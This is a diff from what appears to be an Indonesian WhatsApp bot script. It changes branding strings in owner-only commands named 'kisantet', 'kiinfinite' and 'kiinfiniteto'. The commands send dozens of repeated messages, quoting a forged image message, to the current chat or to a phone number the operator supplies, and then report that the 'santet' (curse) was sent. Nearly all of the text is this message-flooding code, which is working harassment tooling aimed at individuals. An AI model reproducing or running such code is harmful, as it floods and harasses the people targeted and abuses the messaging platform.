+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
             await m.reply(`Berhasil Mengirim Santet Di Nomer ${text}`)
             }
             break
          case 'kisantet':               
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
              asukonyol11 = { 
                     key: { 
                         fromMe: false, 
@@ -6678,69 +6743,69 @@ for (let i = 0; i < jumlah; i++) {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SANTET"},{quoted:asukonyol11})
             await sleep(30000)
             m.reply(`BERHASIL MENGIRIM SANTET`)
             break
                     case 'kiinfinite':               
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
              asukonyol11 = { 
                     key: { 
                         fromMe: false, 
@@ -6750,41 +6815,41 @@ for (let i = 0; i < jumlah; i++) {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             break
             case 'kiinfiniteto':               
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
           if (!text) throw `Nomernya mana?`
              asukonyol11 = { 
                     key: { 
@@ -6795,40 +6860,40 @@ for (let i = 0; i < jumlah; i++) {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
